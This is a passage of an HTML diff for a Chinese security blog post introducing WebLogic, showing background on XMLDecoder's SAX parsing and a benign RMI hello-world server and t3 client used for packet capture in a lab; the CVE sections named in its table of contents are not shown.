@@ -1,197 +1,26 @@
-<!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="XMLDecoder反序列化前置知识： XMLDecoder主要支持SAX和DOM解析标准XML，前者将数据解析为时间流，后者构建它的对象。  DOM在解析时会先构建成一棵树，并进行遍历解析，易受到性能问题的影响。而SAX解析则是线性时间的，XMLDecoder在解析时采用SAX解析规范。  SAX 基于事件驱动的设计模式。拆分即有事件源和事件处理器以及对应的注册方法将两者连接起来  SAX对象使">
-<meta property="og:type" content="article">
-<meta property="og:title" content="初识weblogic">
-<meta property="og:url" content="https://racerz-fighting.github.io/2022/11/29/weblogic/index.html">
-<meta property="og:site_name" content="RacerZ">
-<meta property="og:description" content="XMLDecoder反序列化前置知识： XMLDecoder主要支持SAX和DOM解析标准XML，前者将数据解析为时间流，后者构建它的对象。  DOM在解析时会先构建成一棵树，并进行遍历解析，易受到性能问题的影响。而SAX解析则是线性时间的，XMLDecoder在解析时采用SAX解析规范。  SAX 基于事件驱动的设计模式。拆分即有事件源和事件处理器以及对应的注册方法将两者连接起来  SAX对象使">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221127153725199.png">
-<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_jpg/EkibxOB3fs4icWDXGrFvPicar77FqouLH3snAuDEALiaqKxwAGAnj1tMDSJKjKa7aC80me8TLjJiar8DAGoFyXmzvSQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221127232338408.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221127232543112.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128090141992.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128090904001.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128091050219.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128091242911.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221127185707061.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221127185724397.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128151417439.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128151523504.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128151809466.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128152427037.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128162249221.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128182519156.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128182637643.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128182803106.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128183106601.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128183243076.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128183406376.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128183716501.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128183743432.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128184050013.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221128184602007.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221129212145340.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221129212342511.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221129212642533.png">
-<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221129212902361.png">
-<meta property="article:published_time" content="2022-11-28T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-29T13:46:54.594Z">
-<meta property="article:author" content="RacerZ">
-<meta property="article:tag" content="JAVA安全">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/11/29/weblogic/image-20221127153725199.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>初识weblogic</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<!-- hexo injector head_end start -->
+<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>初识weblogic | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2022/11/29/ctfshow-%E6%A1%86%E6%9E%B6%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/29/weblogic/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&text=初识weblogic"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&is_video=false&description=初识weblogic"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=初识weblogic&body=Check out this article: https://racerz-fighting.github.io/2022/11/29/weblogic/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&title=初识weblogic"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/29/weblogic/&name=初识weblogic&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/29/weblogic/&t=初识weblogic"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">XMLDecoder反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">T3协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-number">3.</span> <span class="toc-text">配置调试环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2015-4582"><span class="toc-number">4.</span> <span class="toc-text">CVE-2015-4582</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">5.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">6.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        初识weblogic
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">RacerZ</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2022-11-28T16:00:00.000Z" itemprop="datePublished">2022-11-29</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <h4 id="XMLDecoder反序列化"><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h4><p><strong>前置知识：</strong></p>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>初识weblogic</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-11-28T16:00:00.000Z" id="date"> 2022-11-29</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-11-29T13:46:54.594Z" id="updated"> 2022-11-29</time></div></span></div></div><hr><div id="post-content"><h4 id="XMLDecoder反序列化"><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h4><p><strong>前置知识：</strong></p>
 <p>XMLDecoder主要支持SAX和DOM解析标准XML，前者将数据解析为时间流，后者构建它的对象。</p>
-<p><img src="/2022/11/29/weblogic/image-20221127153725199.png" alt="image-20221127153725199" style="zoom:50%;"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221127153725199.png'><img src="/2022/11/29/weblogic/image-20221127153725199.png" alt="image-20221127153725199" style="zoom:50%;"></p>
 <p>DOM在解析时会先构建成一棵树，并进行遍历解析，易受到性能问题的影响。而SAX解析则是线性时间的，XMLDecoder在解析时采用<strong>SAX解析规范</strong>。</p>
 <ul>
 <li><p><strong>SAX</strong></p>
 <p>基于事件驱动的设计模式。拆分即有<strong>事件源</strong>和<strong>事件处理器</strong>以及对应的<strong>注册方法</strong>将两者连接起来</p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/EkibxOB3fs4icWDXGrFvPicar77FqouLH3snAuDEALiaqKxwAGAnj1tMDSJKjKa7aC80me8TLjJiar8DAGoFyXmzvSQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" style="zoom:50%;"></p>
+<p class='item-img' data-src='https://mmbiz.qpic.cn/mmbiz_jpg/EkibxOB3fs4icWDXGrFvPicar77FqouLH3snAuDEALiaqKxwAGAnj1tMDSJKjKa7aC80me8TLjJiar8DAGoFyXmzvSQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1'><img src="https://mmbiz.qpic.cn/mmbiz_jpg/EkibxOB3fs4icWDXGrFvPicar77FqouLH3snAuDEALiaqKxwAGAnj1tMDSJKjKa7aC80me8TLjJiar8DAGoFyXmzvSQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" style="zoom:50%;"></p>
 <p>SAX对象使用<code>SAXParser.parer()</code>作为事件源，<code>ContentHandler</code>、<code>ErrorHandler</code>、<code>DTDHandler</code>、<code>EntityResolver</code>作为事件处理器</p>
 </li>
 <li><p><strong>XMLDecoder反序列化流程解析</strong></p>
@@ -218,36 +47,36 @@
 </li>
 </ul>
 <p>下面进行抓包分析，先在服务器端部署jar包，里面是一个简单的demo</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> examples.rmi.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">implements</span> <span class="title class_">IHello</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloImpl</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        name = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HelloImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>(<span class="string">&quot;HelloServer&quot;</span>);</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            ctx.bind(<span class="string">&quot;HelloServer&quot;</span>, obj);</span><br><span class="line">            System.out.println(<span class="string">&quot;HelloImpl created and bound in the registry&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; to the name HelloServer&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;HelloImpl.main: an exception occurred: &quot;</span>);</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> examples.rmi.hello;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IHello</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloImpl</span><span class="hljs-params">(String s)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        name = s;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">HelloImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloImpl</span>(<span class="hljs-string">&quot;HelloServer&quot;</span>);<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            ctx.bind(<span class="hljs-string">&quot;HelloServer&quot;</span>, obj);<br>            System.out.println(<span class="hljs-string">&quot;HelloImpl created and bound in the registry&quot;</span> +<br>                    <span class="hljs-string">&quot; to the name HelloServer&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;HelloImpl.main: an exception occurred: &quot;</span>);<br>            System.out.println(e.getMessage());<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>这里注意部署目录默认时域服务器下的lib目录，也就是<code>/u01/app/oracle/Domains/ExampleSilentWTDomain/lib/</code></p>
-<p><img src="/2022/11/29/weblogic/image-20221127232338408.png" alt="image-20221127232338408"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221127232338408.png'><img src="/2022/11/29/weblogic/image-20221127232338408.png" alt="image-20221127232338408"></p>
 <p>客户端如下（需要配合wlthint3client.jar以支持t3协议）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> examples.rmi.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="comment">// Defines the JNDI context factory.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloClient</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;172.16.80.136&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7001</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">ic</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;t3://&quot;</span> + host + <span class="string">&quot;:&quot;</span> + port);</span><br><span class="line">            <span class="type">IHello</span> <span class="variable">obj</span> <span class="operator">=</span> (IHello) ic.lookup(<span class="string">&quot;HelloServer&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Successfully connected to HelloServer on &quot;</span> +</span><br><span class="line">                    host + <span class="string">&quot; at port &quot;</span> +</span><br><span class="line">                    port + <span class="string">&quot;: &quot;</span> + obj.sayHello());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;An exception occurred: &quot;</span> + ex.getMessage());</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span></span><br><span class="line">            <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/11/29/weblogic/image-20221127232543112.png" alt="image-20221127232543112"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> examples.rmi.hello;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClient</span> &#123;<br>    <span class="hljs-comment">// Defines the JNDI context factory.</span><br>    <span 